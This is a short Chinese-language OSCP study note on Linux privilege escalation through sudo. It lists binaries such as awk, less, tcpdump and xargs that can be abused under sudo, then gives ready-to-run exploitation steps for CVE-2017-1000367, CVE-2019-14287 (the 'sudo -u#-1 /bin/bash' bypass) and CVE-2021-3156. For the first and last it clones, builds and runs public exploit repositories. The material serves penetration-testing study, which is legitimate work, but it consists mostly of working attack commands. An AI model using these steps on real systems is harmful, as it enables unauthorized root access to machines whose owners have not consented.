# Linux  sudo 滥用和 sudo漏洞提权

---

## Table of Contents
 * [sudo 滥用](#sudo-滥用)
 * [sudo 漏洞](#sudo-漏洞)
  * [CVE-2017-1000367](#CVE-2017-1000367)
  * [CVE-2019-14287](#CVE-2019-14287)
  * [CVE-2021-3156](#CVE-2021-3156)

---
# [](#sudo-滥用) sudo 滥用
已知的可用来sudo滥用提权的`linux`可执行文件列表

| 命令   | 命令     | 命令       | 命令      | 命令         | 命令        | 命令    | 
|--------|----------|------------|-----------|--------------|-------------|---------|
| [awk](https://github.com/NongCloud/oscp-Learn/blob/master/Privilege-Escalation/usod/Details/awk.md)| [expect](https://github.com/NongCloud/oscp-Learn/blob/master/Privilege-Escalation/usod/Details/expect.md) | [flock](https://github.com/NongCloud/oscp-Learn/blob/master/Privilege-Escalation/usod/Details/flock.md)| [ftp](https://github.com/NongCloud/oscp-Learn/blob/master/Privilege-Escalation/usod/Details/ftp.md)| [ionice](https://github.com/NongCloud/oscp-Learn/blob/master/Privilege-Escalation/usod/Details/ionice.md)| [less](https://github.com/NongCloud/oscp-Learn/blob/master/Privilege-Escalation/usod/Details/less-more.md)|[more](https://github.com/NongCloud/oscp-Learn/blob/master/Privilege-Escalation/usod/Details/less-more.md)|
|[man](https://github.com/NongCloud/oscp-Learn/blob/master/Privilege-Escalation/usod/Details/man.md)| [rpm](https://github.com/NongCloud/oscp-Learn/blob/master/Privilege-Escalation/usod/Details/rpm.md)| [setarch](https://github.com/NongCloud/oscp-Learn/blob/master/Privilege-Escalation/usod/Details/setarch.md)| [stdbuf](https://github.com/NongCloud/oscp-Learn/blob/master/Privilege-Escalation/usod/Details/stdbuf.md)| [tcpdump](https://github.com/NongCloud/oscp-Learn/blob/master/Privilege-Escalation/usod/Details/tcpdump.md)| [xargs](https://github.com/NongCloud/oscp-Learn/blob/master/Privilege-Escalation/usod/Details/xargs.md)|

---
# [](#sudo-漏洞) sudo 漏洞
* [](CVE-2017-1000367)CVE-2017-1000367
这个项目指定了通过/usr/bin/sum来sudo提权，请根据自己的sudo情况修改文件名
```
git clone https://github.com/c0d3z3r0/sudo-CVE-2017-1000367.git
cd sudo-CVE-2017-1000367
gcc -o sudopwn sudopwn.c -lutil
./sudopwn
```
* [](CVE-2019-14287 )CVE-2019-14287
 
```
$ sudo -u#-1 /bin/bash
或者
$ sudo -u#4294967295 /bin/bash
```

 * [](CVE-2021-3156)CVE-2021-3156
基于堆的缓冲区溢出漏洞
受影响版本
Sudo 1.8.2 - 1.8.31p2
Sudo 1.9.0 - 1.9.5p1
```
git clone https://github.com/blasty/CVE-2021-3156.git
make
./sudo-hax-me-a-sandwich 0
```
